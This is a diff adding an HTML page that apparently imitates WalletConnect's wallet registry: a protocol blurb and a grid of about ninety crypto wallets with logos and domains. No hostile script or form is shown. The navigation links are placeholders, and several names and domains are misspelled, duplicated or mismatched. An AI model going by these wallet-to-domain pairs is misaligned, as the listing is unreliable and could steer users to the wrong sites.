@@ -1,0 +1,1193 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="apple-touch-icon" sizes="180x180" href="../favicon_io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="../favicon_io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../favicon_io/favicon-16x16.png">
+    <link rel="manifest" href="../favicon_io/site.webmanifest">
+    <title>Wallet Registry</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
+    <script src="https://kit.fontawesome.com/50b3f375f9.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="../assets/css/styles.css">
+    <link rel="stylesheet" href="../assets/css/connect.css">
+
+</head>
+
+<body class="wallets">
+    <div class="navbar">
+        <ul>
+            <li>
+                <a href="#">GitHub</a>
+            </li>
+            <li>
+                <a href="#">Docs</a>
+            </li>
+            <li class="text-center">
+                <a href="../"><img src="../assets/images/static/walletconnect-logo.svg" alt="walletconnect-logo"
+                        class="connect-logo"></a>
+            </li>
+            <li>
+                <a href="app.htm">Wallets</a>
+            </li>
+            <li>
+                <a href="#">Apps</a>
+            </li>
+        </ul>
+    </div>
+
+    <div class="container">
+
+        <div class="wallet-banner">
+            <div class="row justify-content-center">
+                <div class="col-lg-8 col-md-10">
+                    <div class="header-section">
+                        <h1>Wallets</h1>
+                        <h2>
+                            Multiple iOS and Android wallets support the WalletConnect. protocol. Simply scan a QR code
+                            from
+                            your desktop computer screen to start securely using a dApp with your mobile wallet.
+                            Interaction
+                            between mobile apps and mobile browsers are supported via mobile deep linking.
+                        </h2>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="images-banner">
+
+            <div class="row justify-content-center">
+                <div class="col-lg-10 col-md-12 col-12">
+                    <div class="row">
+                        <!--beginning of row-->
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/rainbow-wallet-connect.png" alt=""
+                                    class="valet-image">
+                                <p class="p-tag">WalletConnect</p>
+                            </div>
+                        </div>
+
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/coinbase.png" alt="" id="show_1" class="img-fluid" />
+                                <p class="p-tag">Coinbase</p>
+                                <p class="w-p-3">coinbase.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/ledger.png" alt="" id="show_2" class="img-fluid" />
+                                <p class="p-tag">Ledger Live</p>
+                                <p class="w-p-3">ledger.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/metamask.jpg" alt="" id="show_3" class="img-fluid" />
+                                <p class="p-tag">Metamask</p>
+                                <p class="w-p-3">metamask.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/electrum.png" alt="" id="show_4" class="img-fluid" />
+                                <p class="p-tag">Electrum</p>
+                                <p class="w-p-3">electrum.org</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/exodus.png" alt="" id="show_5" class="img-fluid" />
+                                <p class="p-tag">Exodus</p>
+                                <p class="w-p-3">exodus.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/trust_wallet.jpg" alt="" id="show_6"
+                                    class="img-fluid" />
+                                <p class="p-tag">Trust Wallet</p>
+                                <p class="w-p-3">trustwallet.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/phantom.jfif" alt="" id="show_7" class="img-fluid" />
+                                <p class="p-tag">Phantom</p>
+                                <p class="w-p-3">phantom.app</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/walle.jpg" alt="" id="show_8" class="img-fluid" />
+                                <p class="p-tag">Wallet Connect</p>
+                                <p class="w-p-3">walletconnect.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/hash.jfif" alt="" id="show_9" class="img-fluid" />
+                                <p class="p-tag">Hashpack</p>
+                                <p class="w-p-3">hashpack.app</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/keplr.png" alt="" id="show_10" class="img-fluid" />
+                                <p class="p-tag">Keplr</p>
+                                <p class="w-p-3">keplr.app</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/klev.png" alt="" id="show_11" class="img-fluid" />
+                                <p class="p-tag">Klever</p>
+                                <p class="w-p-3">kelever.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/fantom.png" alt="" id="show_12" class="img-fluid" />
+                                <p class="p-tag">Fantom</p>
+                                <p class="w-p-3">fantom.foundation</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/blade.png" alt="" id="show_13" class="img-fluid" />
+                                <p class="p-tag">Blade</p>
+                                <p class="w-p-3">bladewallet.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/cosmos.png" alt="" id="show_14" class="img-fluid" />
+                                <p class="p-tag">Cosmos</p>
+                                <p class="w-p-3">cosmos.network</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/avax.png" alt="" id="show_15" class="img-fluid" />
+                                <p class="p-tag">Avax</p>
+                                <p class="w-p-3">wallet.avax.network</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/stacks.png" alt="" id="show_16" class="img-fluid" />
+                                <p class="p-tag">Stacks wallet</p>
+                                <p class="w-p-3">stacks.co</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/terra.png" alt="" id="show_17" class="img-fluid" />
+                                <p class="p-tag">Terra station</p>
+                                <p class="w-p-3">terra.money</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/polygon.jpg" alt="" id="show_18" class="img-fluid" />
+                                <p class="p-tag">Polygon</p>
+                                <p class="w-p-3">polygon.technology</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/rainbow.jpg" alt="" id="show_19" class="img-fluid" />
+                                <p class="p-tag">Rainbow</p>
+                                <p class="w-p-3">rainbow.me</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/bitpay.jpg" alt="" id="show_20" class="img-fluid" />
+                                <p class="p-tag">Bitpay</p>
+                                <p class="w-p-3">bitpay.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/walleth.jpg" alt="" id="show_21" class="img-fluid" />
+                                <p class="p-tag">Walleth</p>
+                                <p class="w-p-3">walleth.org</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/argent.jpg" alt="" id="show_22" class="img-fluid" />
+                                <p class="p-tag">Argent</p>
+                                <p class="w-p-3">argent.xyz</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/huobi.jpg" alt="" id="show_23" class="img-fluid" />
+                                <p class="p-tag">Huobi Wallet</p>
+                                <p class="w-p-3">huobiwallet.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/encrypted_ink.jpg" alt="" id="show_24"
+                                    class="img-fluid" />
+                                <p class="p-tag">Encrypted Ink</p>
+                                <p class="w-p-3">encrypted.ink</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/compound.jpg" alt="" id="show_25" class="img-fluid" />
+                                <p class="p-tag">Compound</p>
+                                <p class="w-p-3">compound.finance</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/polkadot.jpg" alt="" id="show_26" class="img-fluid" />
+                                <p class="p-tag">Polkadot</p>
+                                <p class="w-p-3">polkadot.network</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/iotex.jpg" alt="" id="show_27" class="img-fluid" />
+                                <p class="p-tag">Iotex</p>
+                                <p class="w-p-3">iotex.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/coin98.jpg" alt="" id="show_28" class="img-fluid" />
+                                <p class="p-tag">Coin98</p>
+                                <p class="w-p-3">coin98.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/crypto.jpg" alt="" id="show_29" class="img-fluid" />
+                                <p class="p-tag">Crypto.com | Defi Wallet</p>
+                                <p class="w-p-3">crypto.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/token_pocket.jpg" alt="" id="show_30"
+                                    class="img-fluid" />
+                                <p class="p-tag">Token Pocket</p>
+                                <p class="w-p-3">tokenpocket.pro</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/math_wallet.jpg" alt="" id="show_31"
+                                    class="img-fluid" />
+                                <p class="p-tag">Math Wallet</p>
+                                <p class="w-p-3">mathwallet.org</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/1inch.jpg" alt="" id="show_32" class="img-fluid" />
+                                <p class="p-tag">1inch</p>
+                                <p class="w-p-3">1inch.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/dharma.jpg" alt="" id="show_33" class="img-fluid" />
+                                <p class="p-tag">Dharma</p>
+                                <p class="w-p-3">dharma.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/trust_vault.jpg" alt="" id="show_34"
+                                    class="img-fluid" />
+                                <p class="p-tag">Trust Vault</p>
+                                <p class="w-p-3">trustology.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/mykey.jpg" alt="" id="show_35" class="img-fluid" />
+                                <p class="p-tag">MYKEY</p>
+                                <p class="w-p-3">mykey.org</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/atomic.jpg" alt="" id="show_36" class="img-fluid" />
+                                <p class="p-tag">Atomic</p>
+                                <p class="w-p-3">atomicwallet.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/cool_wallet_s.jpg" alt="" id="show_37"
+                                    class="img-fluid" />
+                                <p class="p-tag">CoolWallet S</p>
+                                <p class="w-p-3">coolwallet.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/nash.jpg" alt="" id="show_38" class="img-fluid" />
+                                <p class="p-tag">Nash</p>
+                                <p class="w-p-3">nash.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/coinomi.jpg" alt="" id="show_39" class="img-fluid" />
+                                <p class="p-tag">Coinomi</p>
+                                <p class="w-p-3">coinomi.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/gridplus.jpg" alt="" id="show_40" class="img-fluid" />
+                                <p class="p-tag">GridPlus</p>
+                                <p class="w-p-3">gridplus.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/tokenary.jpg" alt="" id="show_41" class="img-fluid" />
+                                <p class="p-tag">Tokenary</p>
+                                <p class="w-p-3">tokenary.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/safepal.jpg" alt="" id="show_42" class="img-fluid" />
+                                <p class="p-tag">SafePal</p>
+                                <p class="w-p-3">safepal.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/infinito.jpg" alt="" id="show_43" class="img-fluid" />
+                                <p class="p-tag">Infinito</p>
+                                <p class="w-p-3">infinitowallet.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/wallet_io.jpg" alt="" id="show_44"
+                                    class="img-fluid" />
+                                <p class="p-tag">Wallet.io</p>
+                                <p class="w-p-3">wallet.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/ownbit.jpg" alt="" id="show_45" class="img-fluid" />
+                                <p class="p-tag">Ownbit</p>
+                                <p class="w-p-3">ownbit.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/easypocket.jpg" alt="" id="show_46"
+                                    class="img-fluid" />
+                                <p class="p-tag">EasyPocket</p>
+                                <p class="w-p-3">easypocket.app</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/bridge_wallet.jpg" alt="" id="show_47"
+                                    class="img-fluid" />
+                                <p class="p-tag">Bridge Wallet</p>
+                                <p class="w-p-3">mtpelerin.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/via_wallet.jpg" alt="" id="show_48"
+                                    class="img-fluid" />
+                                <p class="p-tag">ViaWallet</p>
+                                <p class="w-p-3">viawallet.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/bitkeep.jpg" alt="" id="show_49" class="img-fluid" />
+                                <p class="p-tag">BitKeep</p>
+                                <p class="w-p-3">bitkeep.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/unstoppable_wallet.jpg" alt="" id="show_50"
+                                    class="img-fluid" />
+                                <p class="p-tag">Unstoppable Wallet</p>
+                                <p class="w-p-3">unstoppable.money</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/halodefi_wallet.jpg" alt="" id="show_51"
+                                    class="img-fluid" />
+                                <p class="p-tag">HaloDefi Wallet</p>
+                                <p class="w-p-3">halodefi.org</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/dok_wallet.jpg" alt="" id="show_52"
+                                    class="img-fluid" />
+                                <p class="p-tag">Dok Wallet</p>
+                                <p class="w-p-3">dokwallet.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/celo_wallet.jpg" alt="" id="show_53"
+                                    class="img-fluid" />
+                                <p class="p-tag">Cello Wallet</p>
+                                <p class="w-p-3">cellowallet.app</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/coinus.jpg" alt="" id="show_54" class="img-fluid" />
+                                <p class="p-tag">CoinUs</p>
+                                <p class="w-p-3">coinus.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/valora.jpg" alt="" id="show_55" class="img-fluid" />
+                                <p class="p-tag">Valora</p>
+                                <p class="w-p-3">valoraapp.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/trustee_wallet.jpg" alt="" id="show_56"
+                                    class="img-fluid" />
+                                <p class="p-tag">Trustee Wallet</p>
+                                <p class="w-p-3">trusteeglobal.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/guarda_wallet.jpg" alt="" id="show_57"
+                                    class="img-fluid" />
+                                <p class="p-tag">Gaurda Wallet</p>
+                                <p class="w-p-3">guarda.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/maiarwallet.png" alt="" id="show_58"
+                                    class="img-fluid" />
+                                <p class="p-tag">Maiar Wallet</p>
+                                <p class="w-p-3">maiar.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/jade_wallet.jpg" alt="" id="show_59"
+                                    class="img-fluid" />
+                                <p class="p-tag">Jade Wallet</p>
+                                <p class="w-p-3">jadewallet.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/plasmapay.jpg" alt="" id="show_60"
+                                    class="img-fluid" />
+                                <p class="p-tag">PlasmaPay</p>
+                                <p class="w-p-3">plasmapay.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/o3_wallet.jpg" alt="" id="show_61"
+                                    class="img-fluid" />
+                                <p class="p-tag">O3Wallet</p>
+                                <p class="w-p-3">o3.network</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/hashkey_me.jpg" alt="" id="show_62"
+                                    class="img-fluid" />
+                                <p class="p-tag">HashKey Me</p>
+                                <p class="w-p-3">me.hashkey.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/rwallet.jpg" alt="" id="show_63" class="img-fluid" />
+                                <p class="p-tag">RWallet</p>
+                                <p class="w-p-3">rsk.co</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/flare_wallet.jpg" alt="" id="show_64"
+                                    class="img-fluid" />
+                                <p class="p-tag">Flare Wallet</p>
+                                <p class="w-p-3">flarewallet.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/kyberswap.jpg" alt="" id="show_65"
+                                    class="img-fluid" />
+                                <p class="p-tag">KyberSwap</p>
+                                <p class="w-p-3">kyberswap.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/atoken_wallet.jpg" alt="" id="show_66"
+                                    class="img-fluid" />
+                                <p class="p-tag">AToken Wallet</p>
+                                <p class="w-p-3">atoken.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/tongue_wallet.jpg" alt="" id="show_67"
+                                    class="img-fluid" />
+                                <p class="p-tag">Tongue Wallet</p>
+                                <p class="w-p-3">tongue.fi</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/xinfin.jpg" alt="" id="show_68" class="img-fluid" />
+                                <p class="p-tag">XinFin XDC Network</p>
+                                <p class="w-p-3">xinfin.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/talken_wallet.jpg" alt="" id="show_69"
+                                    class="img-fluid" />
+                                <p class="p-tag">Talken Wallet</p>
+                                <p class="w-p-3">talken.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/keyring_pro.jpg" alt="" id="show_70"
+                                    class="img-fluid" />
+                                <p class="p-tag">KEYRING PRO</p>
+                                <p class="w-p-3">keyring.app</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/midas_wallet.jpg" alt="" id="show_71"
+                                    class="img-fluid" />
+                                <p class="p-tag">Midas Wallet</p>
+                                <p class="w-p-3">midasprotocol.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/at_wallet.jpg" alt="" id="show_72"
+                                    class="img-fluid" />
+                                <p class="p-tag">AT.Wallet</p>
+                                <p class="w-p-3">authentrend.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/imtoken.jpg" alt="" id="show_73" class="img-fluid" />
+                                <p class="p-tag">imToken</p>
+                                <p class="w-p-3">token.im</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/morixwallet.png" alt="" class="valet-image">
+                                <p class="p-tag">MoriX Wallet</p>
+                                <p class="w-p-3">morixjp.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/meetone.jpg" alt="" class="valet-image">
+                                <p class="p-tag">MEET.ONE</p>
+                                <p class="w-p-3">meet.one</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/vision.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">Vision</p>
+                                <p class="w-p-3">visionwallet.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/swift.png" alt="" class="valet-image">
+                                <p class="p-tag">SWFT Wallet</p>
+                                <p class="w-p-3">swft.pro</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/peakdefi.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">PEAKDEFI Wallet</p>
+                                <p class="w-p-3">peakdefi.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/sparkpoint.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">SparkPoint</p>
+                                <p class="w-p-3">sparkpoint.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/viawallet.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">ViaWallet</p>
+                                <p class="w-p-3">vivawallet.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/onto.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">ONTO</p>
+                                <p class="w-p-3">onto.app</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/ownbit.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">Ownbit</p>
+                                <p class="w-p-3">ownbit.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/infinity.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">Infinity Wallet</p>
+                                <p class="w-p-3">infinitywallet.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/spatium.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">Spatium</p>
+                                <p class="w-p-3">spatium.net</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/equal.jpg" alt="" class="valet-image">
+                                <p class="p-tag">Equal</p>
+                                <p class="w-p-3">equaltoken.io</p>
+                            </div>
+                        </div>
+
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/alice.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">Alice</p>
+                                <p class="w-p-3">alicebob.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/alphawallet.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">AlphaWallet</p>
+                                <p class="w-p-3">alphawallet.com</p>
+                            </div>
+                        </div>
+
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/eidoo.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">Eidoo</p>
+                                <p class="w-p-3">eidoo-wallet.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/zelcore.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">ZelCore</p>
+                                <p class="w-p-3">zelcore.io</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/xaman.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">Xaman</p>
+                                <p class="w-p-3">xumm.app</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/authereum.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">Authereum</p>
+                                <p class="w-p-3">kovan.authereum.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/pillar.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">Pillar</p>
+                                <p class="w-p-3">pillar.fi</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/mewwallet.png" alt="" class="valet-image">
+                                <p class="p-tag">MyEtherWallet</p>
+                                <p class="w-p-3">myetherwallet.com</p>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/gnosis-safe.jpeg" alt="" class="valet-image">
+                                <p class="p-tag">Gnosis Safe Multisig</p>
+                                <p class="w-p-3">gnosis.io</p>
+                            </div>
+                        </div>
+
+
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <div class="img-box">
+                                <img src="../assets/images/static/walle.jpg" alt="" id="show_1" class="img-fluid" />
+                                <p class="p-tag">Others</p>
+                            </div>
+                        </div>
+
+                        <!--end of row-->
+                    </div>
+                </div>
+            </div>
+            <!--end of image-banner-->
+        </div>
+
+        <div class="bottom-info">
+            <h5 class="text-center">
+                Open an app submission issue on <a href="./"> GitHub </a> to add your app here.
+            </h5>
+        </div>
+
